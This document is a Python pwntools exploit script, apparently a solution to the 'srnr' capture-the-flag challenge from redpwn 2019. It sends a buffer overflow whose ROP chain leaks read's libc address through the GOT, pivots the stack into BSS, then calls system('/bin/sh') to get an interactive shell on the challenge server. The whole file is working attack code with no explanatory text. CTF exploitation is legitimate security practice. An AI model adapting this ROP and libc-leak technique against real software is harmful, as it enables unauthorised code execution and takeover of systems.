from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./srnr")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./srnr")
else:
	p = remote("chall.2019.redpwn.net","4008")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./srnr")

def debugf():
	if debug:
		gdb.attach(p,"b *0x00000000004007AD")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
rdi = 0x0000000000400823
rsi2 = 0x0000000000400821
rsp3 = 0x000000000040081d
bss_addr = 0x0000000000602500
p.sendlineafter("[#] number of bytes: ","0")
payload = "a" * 9 + p64(0)
payload += p64(rdi) + p64(0)
payload += p64(rsi2) + p64(bss_addr) + p64(0)
payload += p64(elf.plt["read"])
payload += p64(rdi) + p64(bss_addr)
payload += p64(rsi2) + p64(elf.got["read"]) + p64(0)
payload += p64(elf.plt["printf"])
payload += p64(rdi) + p64(0)
payload += p64(rsi2) + p64(bss_addr) + p64(0)
payload += p64(elf.plt["read"])
payload += p64(rsp3) + p64(bss_addr - 0x18)
p.send(payload)
raw_input()
p.send("%s\x00")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["read"]
log.success("libc_base:" + hex(libc.address))
raw_input()
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload = p64(rdi) + p64(binsh) + p64(system)
p.send(payload)
p.interactive()
